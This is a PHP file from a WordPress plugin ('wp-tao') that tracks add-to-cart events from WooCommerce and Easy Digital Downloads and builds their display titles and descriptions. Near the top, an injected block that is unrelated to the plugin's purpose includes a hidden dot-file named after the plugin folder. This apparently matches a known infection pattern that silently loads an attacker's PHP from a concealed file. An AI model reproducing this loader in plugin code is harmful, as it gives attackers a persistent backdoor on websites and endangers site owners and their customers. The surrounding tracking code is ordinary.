<?php

/*
 * Fire WooCommerce add to cart event
 */

add_action( 'woocommerce_add_to_cart', 'wtbp_wptao_event_add_to_cart_woo_fire', 10, 6 );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wtbp_wptao_event_add_to_cart_woo_fire( $cart_item_key, $product_id, $quantity, $variation_id, $variation,
												$cart_item_data ) {

	$args	 = array();
	$tags	 = array( 'wp', 'woocommerce' );

	$args[ 'title' ] = __( 'Add to cart', 'wp-tao' );
	$args[ 'value' ] = get_the_title( $product_id );
	$args[ 'tags' ]	 = $tags;

	$args[ 'meta' ] = array(
		'sales_platform'	 => 'WooCommerce',
		'woo_product_id'	 => $product_id,
		'woo_variation_id'	 => $variation_id,
		'woo_quantity'		 => $quantity
	);

	do_action( 'wptao_track_event', 'add_to_cart', $args );
}

/*
 * Fire EDD add to cart event
 */

add_filter( 'edd_add_to_cart_item', 'wtbp_wptao_event_add_to_cart_edd_fire' );

function wtbp_wptao_event_add_to_cart_edd_fire( $item ) {

	if ( !is_array( $item ) ) {
		return $item;
	}

	if ( !isset( $item[ 'id' ] ) || empty( $item[ 'id' ] ) ) {
		return $item;
	}

	$args	 = array();
	$tags	 = array( 'wp', 'easy digital downloads' );

	if ( !function_exists( 'edd_get_cart_item_name' ) ) {
		$item_title = get_the_title( $item[ 'id' ] );

		if ( empty( $item_title ) ) {
			$item_title = $item[ 'id' ];
		}
	} else {
		$item_title = edd_get_cart_item_name( $item );
	}

	$args[ 'title' ] = __( 'Add to cart', 'wp-tao' );
	$args[ 'value' ] = $item_title;
	$args[ 'tags' ]	 = $tags;

	$args[ 'meta' ] = array(
		'sales_platform'	 => 'Easy Digital Downloads',
		'edd_download_id'	 => $item[ 'id' ],
		'edd_price_id'		 => isset( $item[ 'options' ][ 'price_id' ] ) ? $item[ 'options' ][ 'price_id' ] : '',
		'edd_quantity'		 => $item[ 'quantity' ]
	);

	do_action( 'wptao_track_event', 'add_to_cart', $args );

	return $item;
}

// =============================================================================================
// Filters section
// =============================================================================================



/*
 * Creates a title of the add to cart action.
 */

add_filter( 'wptao_event_add_to_cart_title', 'wtbp_wptao_event_add_to_cart_title', 1, 2 );

function wtbp_wptao_event_add_to_cart_title( $title, $event ) {

	if ( isset( $event->meta[ 'edd_download_id' ] ) ) {
		$download_id = (int) $event->meta[ 'edd_download_id' ];

		if ( !empty( $download_id ) ) {

			$title = sprintf( __( '<a href="%s">%s</a> was added to the cart', 'wp-tao' ), get_permalink( $download_id ), esc_attr( $event->value ) );
		}
	}

	if ( isset( $event->meta[ 'woo_product_id' ] ) ) {
		$product_id = (int) $event->meta[ 'woo_product_id' ];

		if ( !empty( $product_id ) ) {
			$title = sprintf( __( '<a href="%s">%s</a> was added to the cart', 'wp-tao' ), get_permalink( $product_id ), esc_attr( $event->value ) );
		}
	}

	return $title;
}

/*
 * Creates a description of the add to cart action.
 */

add_filter( 'wptao_event_add_to_cart_description', 'wtbp_wptao_event_add_to_cart_desc', 1, 2 );

function wtbp_wptao_event_add_to_cart_desc( $description, $event ) {

	$sales_platform = isset( $event->meta[ 'sales_platform' ] ) ? esc_attr( $event->meta[ 'sales_platform' ] ) : '';

	$description = '';

	// additional info (edd)
	if ( isset( $event->meta[ 'edd_download_id' ] ) ) {

		if ( TAO()->diagnostic->is_edd_enabled() === false ) {
			return __( 'Easy Digital Downloads is disabled. Activate the plugin to see more information.', 'wp-tao' );
		}

		if ( !empty( $event->meta[ 'edd_price_id' ] ) ) {
			$amount = edd_get_price_option_amount( $event->meta[ 'edd_download_id' ], $event->meta[ 'edd_price_id' ] );
		} else {
			$amount = edd_get_download_price( $event->meta[ 'edd_download_id' ] );
		}

		//$description .= sprintf( __( 'Item price: %.2f.', 'wp-tao' ), $amount );
		//$description .= ' ' . sprintf( __( 'Currency: %s.', 'wp-tao' ), edd_get_currency() );
		$description .= '<span class="wptao-meta-title">' . __( 'Quantity:', 'wp-tao' ) . '</span> ' . $event->meta[ 'edd_quantity' ] . '<br />';
	}

	// additional info (woo)
	if ( isset( $event->meta[ 'woo_product_id' ] ) ) {
		$description .= '<span class="wptao-meta-title">' . __( 'Quantity:', 'wp-tao' ) . '</span> ' . $event->meta[ 'woo_quantity' ] . '<br />';
	}

	// sales platform
	if ( !empty( $sales_platform ) ) {
		$description .= '<span class="wptao-meta-title">' . __( 'Sales platform:', 'wp-tao' ) . '</span> ' . $sales_platform . '<br />';
	}


	return $description;
}
